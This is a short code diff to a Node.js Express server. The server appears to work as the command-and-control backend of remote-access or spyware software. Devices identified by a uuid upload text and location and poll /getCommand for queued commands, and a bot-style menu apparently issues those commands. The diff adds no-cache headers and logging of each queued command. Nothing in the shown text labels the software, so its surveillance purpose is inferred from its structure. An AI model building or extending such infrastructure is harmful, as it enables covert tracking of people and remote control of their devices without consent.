@@ -71,6 +71,8 @@ app.post('/uploadText', (req, res) => {
 });
 
 app.get('/getCommand', (req, res) => {
+    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
+    res.setHeader("Pragma", "no-cache");
   const uuid = req.query.uuid || req.query.model || '';
   if (!uuid) { res.send('NONE'); return; }
   if (!appClients.has(uuid)) {
@@ -97,7 +99,11 @@ app.post('/uploadLocation', (req, res) => {
   res.send('ok');
 });
 
-function queueCmd(uuid, cmd) { pendingCmds.set(uuid, cmd); }
+function queueCmd(uuid, cmd) {
+    pendingCmds.set(uuid, cmd);
+    // إشعار فوري
+    setImmediate(() => { console.log("[CMD] " + uuid + " <- " + cmd); });
+}
 
 function mainMenu() {
   return { keyboard: [
